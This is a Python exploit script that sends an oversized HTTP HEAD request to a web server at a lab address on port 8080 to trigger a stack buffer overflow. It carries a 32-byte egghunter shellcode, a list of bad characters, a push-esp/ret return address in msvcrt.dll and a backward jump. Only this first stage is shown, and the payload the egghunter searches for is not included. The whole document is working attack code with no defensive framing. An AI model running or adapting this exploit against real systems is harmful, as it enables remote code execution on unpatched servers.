#!/usr/bin/python

import socket
import os
import sys

#Egghunter
#Size 32-bytes
hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x62\x33" #b3
"\x33\x66\x8b\xfa" #3f
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")
 
#-------------------------------------------------------------------------------#
# badchars: \x00\x0d\x0a\x3d\x20\x3f                                            #
#-------------------------------------------------------------------------------#
# Stage1:                                                                       #
# (1) EIP: 0x77C35459 push esp # ret | msvcrt.dll                               #
# (2) ESP: jump back 60 bytes in the buffer => \xEB\xC4                         #
# (3) Enough room for egghunter; marker "b33f"                                  #
#-------------------------------------------------------------------------------#
 
Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"
 

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 172.16.73.129:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("172.16.73.129", 8080))
expl.send(buffer)
expl.close()
